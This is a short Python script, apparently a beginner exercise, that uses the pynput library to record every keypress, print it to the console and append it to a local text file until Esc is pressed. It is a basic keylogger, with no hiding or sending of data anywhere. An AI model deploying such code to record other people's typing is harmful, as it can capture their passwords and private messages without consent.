

from pynput.keyboard import Key, Listener

count=0
keys=[]


def clicked(key):
    global keys, count

    keys.append(key)
    count+=1
    print("{0} pressed".format(key))

    if count>=0:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open("file.txt", "a") as f:
        for key in keys:
            f.write(str(key))

def release(key):
    if key==Key.esc:
        return False
def listen_to_keyboard():

    with Listener(on_press=clicked, on_release=release) as listener:

        listener.join()



